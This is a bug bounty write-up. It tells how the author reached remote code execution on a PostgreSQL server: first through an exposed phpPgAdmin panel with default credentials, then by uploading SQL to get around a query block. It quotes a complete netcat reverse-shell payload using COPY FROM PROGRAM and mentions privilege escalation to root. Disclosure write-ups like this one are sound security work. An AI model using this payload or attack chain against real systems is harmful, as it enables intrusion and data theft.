---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-08-29_bug-bounty-my-remote-code-execution.md
original_filename: 2021-08-29_bug-bounty-my-remote-code-execution.md
title: 'Bug Bounty: “My Remote Code Execution”'
category: documents
detected_topics:
- access-control
- command-injection
- sso
- sqli
- rate-limit
tags:
- imported
- documents
- access-control
- command-injection
- sso
- sqli
- rate-limit
language: en
raw_sha256: 6a4d57c634c861ad0e1f433b8f88eb24f44f5f1d32f08c5795e78ab904236298
text_sha256: 0dec31a76c2a4bc9c47ee21e4dffa38912a6b9c389ec05a6e8a76241ecb38f4c
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Bug Bounty: “My Remote Code Execution”

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-08-29_bug-bounty-my-remote-code-execution.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, sso, sqli, rate-limit
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `6a4d57c634c861ad0e1f433b8f88eb24f44f5f1d32f08c5795e78ab904236298`
- Text SHA256: `0dec31a76c2a4bc9c47ee21e4dffa38912a6b9c389ec05a6e8a76241ecb38f4c`


## Content

---
title: "Bug Bounty: “My Remote Code Execution”"
url: "https://0xjin.medium.com/bug-bounty-my-remote-code-execution-da7bbd00925a"
authors: ["0xJin (@0xJin)"]
bugs: ["Default credentials", "RCE"]
publication_date: "2021-08-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3377
scraped_via: "browseros"
---

# Bug Bounty: “My Remote Code Execution”

Bug Bounty: “My Remote Code Execution”
N0t0d4y
Follow
3 min read
·
Aug 29, 2021

250

2

First Step:

In first, i found my subdomain using Amass tool.

After i used ffuf tool for brute force the directories and i found an Improper access control: https://subdomain.xxx.com/phppgadmin

There was a page with need to submit credentials, user and password.

I tried some combination of user/password with googling, and thanks to google i found it. And you know? I was IN.

This was my reaction !
Access Database:

Now i got FULL access on their database, i got all password and username. Admin password and other user passoword. That’s was awesome.

But i never tried to crack some password. I tried to get a reverse shell.

SQL Injection:

In this moment i got the GUI of phppgadmin and i can execute SQL query.

But wait.. No i can’t! Because query statement block my injection, and only from localhost i can execute the query.

Press enter or click to view image in full size
SQL Injection blocked!
SQL Injection Bypass:

At this point, after too much hours, i notice that i can bypass the query statement just uploading the query via upload button, and you know? The query was correctly execute!!

Get N0t0d4y’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Successfully SQL bypass statement.

You can find this exploit in exploit-db with my name: https://www.exploit-db.com/exploits/49736 .

This is the result:

RCE

RCE done!

Remote Code Execution:

Ok now that the RCE was DONE! I was trying to get and iShell (Interactive shell) or reverse shell. So i tryind to find with my RCE if there is NC (netcat) on their kernel installed , with command: which nc and the output was /usr/bin/nc.

Second reaction!

At this point i just change the payload with my IP and PORT, my payload was: COPY cmd_exec FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [$MyIp] [$MyPort]>/tmp/f’;

And i WAS IN! Got localhost! But i was default user “postgres” .

I notice with “uname -a” that the kernel was vulnerable with a local privilege escalation exploit.

And i notice i can escape from postgres because runs under root.

So i could get root!

Thanks guys! Follow me on Twitter: @0xJin

In the final this was reported:

Resolved!
Buy me a coffe if you like it :)
